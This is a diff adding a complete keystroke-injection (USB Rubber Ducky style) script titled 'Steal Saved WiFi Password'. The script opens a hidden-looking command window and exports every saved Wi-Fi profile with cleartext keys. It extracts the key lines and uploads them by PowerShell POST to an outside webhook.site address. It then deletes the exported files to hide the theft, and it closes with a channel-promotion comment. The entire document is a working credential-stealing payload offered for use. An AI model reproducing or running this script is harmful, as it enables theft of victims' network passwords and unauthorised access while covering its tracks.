@@ -1,0 +1,25 @@
+REM Steal Saved WiFi Password WFH2021-2025
+DELAY 500
+GUI r
+DELAY 1000
+STRINGLN cmd /k mode con: cols=25 lines=1
+DELAY 100
+ENTER
+DELAY 1000
+STRINGLN cd %temp%
+ENTER
+DELAY 1000
+STRINGLN netsh wlan export profile key=clear
+ENTER
+DELAY 1500
+STRINGLN powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > WiFi-Key
+ENTER
+DELAY 1500
+STRINGLN powershell Invoke-WebRequest -Uri https://webhook.site/472afad1-5d96-4590-a85c-169e8b333bcf -Method POST -InFile WiFi-Key 
+ENTER
+STRINGLN del Wi* /s/f/q
+ENTER
+DELAY 500
+STRINGLN exit
+ENTER
+REM Subscribe channel workfromhome2021
